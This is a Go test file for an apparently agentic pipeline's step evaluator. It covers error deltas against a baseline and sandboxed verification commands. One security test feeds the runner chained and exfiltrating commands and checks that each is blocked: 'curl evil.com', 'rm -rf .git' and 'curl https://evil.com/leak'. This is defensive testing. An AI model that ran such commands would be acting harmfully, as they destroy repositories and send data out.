package evaluator

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/woowonjae1/52hzAgents/workspace/backend/internal/models"
)

func TestExtractErrorLines(t *testing.T) {
	output := "Compiling...\nmain.go:10: syntax error: unexpected semicolon\nexit status 1\nDone."
	lines := ExtractErrorLines(output, 5)

	if len(lines) != 2 {
		t.Errorf("Expected 2 error lines (syntax error and exit status), got %d: %v", len(lines), lines)
	}
}

func TestCalculateNewErrors(t *testing.T) {
	baseline := []string{
		"legacy.go:10: undefined: OldVariable",
		"FAIL: TestOldFeature",
	}

	// 1. Same errors -> delta is empty
	finalSame := []string{
		"legacy.go:10: undefined: OldVariable",
		"FAIL: TestOldFeature",
	}
	newErrors := CalculateNewErrors(baseline, finalSame)
	if len(newErrors) != 0 {
		t.Errorf("Expected 0 new errors for identical errors, got %d: %v", len(newErrors), newErrors)
	}

	// 2. New error introduced -> delta contains only the new error
	finalWithNew := []string{
		"legacy.go:10: undefined: OldVariable",
		"auth.go:42: syntax error: unexpected newline",
		"FAIL: TestOldFeature",
		"FAIL: TestAuthFeature",
	}
	newErrors = CalculateNewErrors(baseline, finalWithNew)
	if len(newErrors) != 2 {
		t.Errorf("Expected 2 new errors, got %d: %v", len(newErrors), newErrors)
	}
}

func TestEvaluateTurnWithVerification_PreExistingDebtPass(t *testing.T) {
	step := models.PipelineStep{
		Agent:       "coder",
		Instruction: "Implement user avatar endpoint",
		MaxRetries:  3,
		RetryCount:  0,
	}
	_ = step

	baseline := &VerificationRunResult{
		Command:  "go test ./...",
		ExitCode: 1,
		Output:   "legacy_test.go:20: FAIL: TestLegacyBrokenFeature",
		Errors:   []string{"legacy_test.go:20: FAIL: TestLegacyBrokenFeature"},
	}

	// Suppose verification command fails on legacy error, but introduces no new regression
	delta := CalculateNewErrors(baseline.Errors, []string{"legacy_test.go:20: FAIL: TestLegacyBrokenFeature"})
	if len(delta) != 0 {
		t.Fatalf("Expected 0 delta for pre-existing broken test, got %d", len(delta))
	}
}

func TestRunVerificationCommand_SecurityAndIsolation(t *testing.T) {
	tempDir := t.TempDir()

	// 1. Chaining attempt should be blocked immediately (ExitCode 126)
	res1, _ := RunVerificationCommand(tempDir, "npm test && curl evil.com", 5*time.Second)
	if res1 == nil || res1.ExitCode != 126 {
		t.Fatalf("Expected chaining command to be blocked with 126, got: %+v", res1)
	}

	// 2. Semicolon chaining attempt
	res2, _ := RunVerificationCommand(tempDir, "go test ./...; rm -rf .git", 5*time.Second)
	if res2 == nil || res2.ExitCode != 126 {
		t.Fatalf("Expected semicolon command to be blocked with 126, got: %+v", res2)
	}

	// 3. Unauthorized egress runner (curl) should be blocked (ExitCode 126)
	res3, _ := RunVerificationCommand(tempDir, "curl https://evil.com/leak", 5*time.Second)
	if res3 == nil || res3.ExitCode != 126 {
		t.Fatalf("Expected curl to be blocked with 126, got: %+v", res3)
	}

	// 4. Valid runner without chaining
	res4, err := RunVerificationCommand(tempDir, "go version", 5*time.Second)
	if err != nil || res4 == nil || res4.ExitCode != 0 {
		t.Fatalf("Expected 'go version' to succeed, got err=%v res=%+v", err, res4)
	}
}

// writeCheck puts a tiny Go program in dir that fails unless out.txt says "good".
func writeCheck(t *testing.T, dir string) {
	t.Helper()
	src := `package main

import (
	"fmt"
	"os"
	"strings"
)

func main() {
	b, err := os.ReadFile("out.txt")
	if err != nil {
		fmt.Fprintln(os.Stderr, "error: out.txt is missing")
		os.Exit(1)
	}
	if s := strings.TrimSpace(string(b)); s != "good" {
		fmt.Fprintf(os.Stderr, "error: out.txt has wrong content %q\n", s)
		os.Exit(1)
	}
	fmt.Println("ok")
}
`
	if err := os.WriteFile(filepath.Join(dir, "check.go"), []byte(src), 0o644); err != nil {
		t.Fatal(err)
	}
}

func writeOut(t *testing.T, dir, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(dir, "out.txt"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestEvaluateStep_TurnErrorFails(t *testing.T) {
	step := models.PipelineStep{Agent: "coder", Instruction: "check the build and fix it", MaxRetries: 3}
	res := EvaluateStep("coder", step, "claude exited with code 1", "", "", nil)
	if res.Status != EvalFail || res.VerifiedBy != "turn_error" {
		t.Fatalf("a failed turn must fail the step, got %v/%s", res.Status, res.VerifiedBy)
	}
	if !strings.Contains(res.FeedbackMessage, "Retry 1/3") || !strings.Contains(res.FeedbackMessage, "claude exited with code 1") {
		t.Fatalf("feedback must name the retry and the error: %q", res.FeedbackMessage)
	}
}

// Without a command there is no evidence either way, so the step passes and
// says it was not verified. The reply's wording is not evidence.
func TestEvaluateStep_NoCommandPassesUnverified(t *testing.T) {
	step := models.PipelineStep{Agent: "coder", Instruction: "refactor"}
	res := EvaluateStep("coder", step, "", t.TempDir(), "", nil)
	if res.Status != EvalPass || res.VerifiedBy != "unverified" {
		t.Fatalf("expected an unverified pass, got %v/%s", res.Status, res.VerifiedBy)
	}
}

// The old keyword exemption passed any step whose instruction contained
// "check"/"优化" without running the command at all.
func TestEvaluateStep_KeywordInInstructionDoesNotSkipCommand(t *testing.T) {
	dir := t.TempDir()
	writeCheck(t, dir)
	writeOut(t, dir, "bad")
	step := models.PipelineStep{Agent: "coder", Instruction: "优化 the parser and check the tests"}
	res := EvaluateStep("coder", step, "", dir, "go run check.go", nil)
	if res.Status != EvalFail || res.VerifiedBy != "command" {
		t.Fatalf("the command must run and fail, got %v/%s (%s)", res.Status, res.VerifiedBy, res.Reason)
	}
	if res.Final == nil || res.Final.ExitCode == 0 {
		t.Fatalf("expected the failing run to be returned, got %+v", res.Final)
	}
	// The failure must come from check.go itself, not from the toolchain
	// failing to start (a stripped environment once failed every run alike).
	if !strings.Contains(strings.Join(res.ErrorDetails, "\n"), "wrong content") {
		t.Fatalf("expected check.go's own error, got %v", res.ErrorDetails)
	}
}

func TestEvaluateStep_PreExistingFailurePasses(t *testing.T) {
	dir := t.TempDir()
	writeCheck(t, dir)
	baseline, _ := RunVerificationCommand(dir, "go run check.go", 60*time.Second)
	if baseline == nil || baseline.ExitCode == 0 || !strings.Contains(strings.Join(baseline.Errors, "\n"), "missing") {
		t.Fatalf("expected check.go to fail on the missing file, got %+v", baseline)
	}
	step := models.PipelineStep{Agent: "coder", Instruction: "update the docs"}
	res := EvaluateStep("coder", step, "", dir, "go run check.go", baseline)
	if res.Status != EvalPass {
		t.Fatalf("a failure that predates the step must not fail it: %v (%s)", res.Status, res.Reason)
	}
}

func TestEvaluateStep_NewErrorFailsDespiteBrokenBaseline(t *testing.T) {
	dir := t.TempDir()
	writeCheck(t, dir)
	baseline, _ := RunVerificationCommand(dir, "go run check.go", 60*time.Second) // "missing"
	writeOut(t, dir, "bad")
	step := models.PipelineStep{Agent: "coder", Instruction: "write out.txt"}
	res := EvaluateStep("coder", step, "", dir, "go run check.go", baseline)
	if res.Status != EvalFail {
		t.Fatalf("a new error must fail the step even on a broken baseline: %v (%s)", res.Status, res.Reason)
	}
	if !strings.Contains(strings.Join(res.ErrorDetails, "\n"), "wrong content") {
		t.Fatalf("expected the new error to be reported, got %v", res.ErrorDetails)
	}
}
